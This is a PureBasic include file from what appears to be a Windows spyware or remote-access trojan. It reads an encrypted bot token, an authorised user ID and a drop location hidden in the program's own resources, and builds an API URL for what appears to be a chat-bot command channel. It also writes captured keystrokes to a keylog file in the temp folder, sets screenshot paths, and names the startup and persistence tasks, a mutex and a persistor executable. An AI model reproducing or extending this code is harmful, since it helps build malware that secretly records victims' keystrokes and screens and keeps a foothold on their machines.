;include file for reading/writing states from files
XIncludeFile "constants.pbi"
XIncludeFile "resourcereader.pbi"

EnableExplicit

Declare.s getKeylogFilePath()
Declare.s getEncryptionKey()

Procedure.q getLastUpdateId()
    Define tmp.s,file.l,retval.q
    file=OpenFile(#PB_Any, UPDATE_ID_FILE, #PB_File_SharedRead | #PB_UTF8)
    If file
      tmp= ReadString(file)
      CloseFile(file)
    EndIf
    retval=Val(tmp)
    ProcedureReturn retval
  EndProcedure

Procedure saveUpdateId(updateId.l)
  Define file.l
  file=OpenFile(#PB_Any, UPDATE_ID_FILE, #PB_File_SharedWrite | #PB_UTF8)
  If file
    WriteString(file,Str(updateId))
    CloseFile(file)
  EndIf
EndProcedure

Procedure saveKeylogFile(buffer.s)
  Define file.l
  file=OpenFile(#PB_Any,getKeylogFilePath(),#PB_File_Append | #PB_UTF8)
  If file
    WriteString(file,buffer)
    CloseFile(file)
  EndIf
EndProcedure

Procedure.s ExtractFilename(filePath.s)
  Define occurrences.i,retval.s
  occurrences=CountString(filePath,"\")  
  retval=StringField(filePath,occurrences+1,"\")
  ProcedureReturn retval
EndProcedure

Procedure.s GetSelfPath()
  CompilerIf #PB_Compiler_Debugger
    ProcedureReturn "C:\Users\s0ft\AppData\Roaming\shiltimur.exe"
  CompilerElse
    ProcedureReturn ProgramFilename()
  CompilerEndIf
EndProcedure


Procedure.s ExtractParamsFromResource()
  Define currpath.s,botToken.s,userId.s
  Define dropPath.s,exeName.s
  currpath=GetSelfPath()
  botToken=ReadStringFromResource(currpath,getEncryptionKey(),"params","bottoken")
  userId=ReadStringFromResource(currpath,getEncryptionKey(),"params","userid")
  dropPath=ReadStringFromResource(currpath,getEncryptionKey(),"params","droppath")
  exeName=ReadStringFromResource(currpath,getEncryptionKey(),"params","exename")
  BOT_TOKEN=botToken ;populate the global variable
  AUTHENTICATED_USER_ID=Val(userId) ;populate the global variable
  DROP_PATH=dropPath ;populate the global variable
  DROP_EXENAME=exeName ;populate the global variable
EndProcedure


Procedure.s getApiURL()
  ProcedureReturn  ROOT_URL+BOT_TOKEN+"/"
EndProcedure

Procedure.q getAuthenticatedUserId()
  ProcedureReturn AUTHENTICATED_USER_ID  
EndProcedure

Procedure.s getScreenshotFilePath()
  ProcedureReturn GetEnvironmentVariable("tmp")+"\"+ SCREENSHOT_FILENAME  
EndProcedure

Procedure.s getKeylogFilePath()
  ProcedureReturn GetEnvironmentVariable("tmp")+"\"+ KEYLOG_FILENAME  
EndProcedure

Procedure.s getStartupTaskName()
  ProcedureReturn STARTUP_TASK_NAME  
EndProcedure

Procedure.s getPersistTaskName()
  ProcedureReturn PERSIST_TASK_NAME  
EndProcedure

Procedure.s getMutexName()
  ProcedureReturn MUTEX_NAME  
EndProcedure

Procedure.s getDropPath()
  Define retval.s
  Select DROP_PATH  
    Case "%appdata%"
      retval= GetEnvironmentVariable("appdata")
    Case "%tmp%"
      retval= GetEnvironmentVariable("tmp")
    Case "%programfiles%"
      retval= GetEnvironmentVariable("programfiles")
    Case "%userprofile%"
      retval=GetEnvironmentVariable("userprofile")
    Case "%windir%"
      retval=GetEnvironmentVariable("windir")
    Case "%systemdrive%"
      retval=GetEnvironmentVariable("systemdrive")
    Case "%system32%"
      retval=GetEnvironmentVariable("windir")+"\system32"
  EndSelect
  
  If Not FileSize(retval)=-2 ;if retval isn't a valid directory path
    retval=GetEnvironmentVariable("tmp")
  EndIf
  
  ProcedureReturn retval  
EndProcedure

Procedure.s getExeName()
  ProcedureReturn DROP_EXENAME  
EndProcedure

Procedure.s getPersistorExeName()
  ProcedureReturn PERSISTOR_EXENAME  
EndProcedure

Procedure.s getPersistorPath()
  ProcedureReturn GetEnvironmentVariable("appdata")  
EndProcedure

Procedure.s getEncryptionKey()
  ProcedureReturn ENCRYPTION_KEY  
EndProcedure

; IDE Options = PureBasic 5.70 LTS (Windows - x86)
; CursorPosition = 7
; Folding = ----
; EnableAsm
; EnableThread
; EnableXP
; EnablePurifier